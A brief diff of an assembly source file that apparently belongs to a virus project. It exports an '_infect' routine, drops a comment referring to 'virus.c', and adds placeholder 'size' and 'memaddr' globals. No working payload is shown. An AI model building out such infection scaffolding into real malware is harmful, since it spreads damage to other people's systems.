@@ -1,9 +1,12 @@
 extern entry
 
-;add other global stuff (check virus.c)
-
 section .text
 global _infect
+global size
+global memaddr
+
+size: db `0000000000000000`
+memaddr: db `0000000000000000`
 
 _infect:
 	push rax
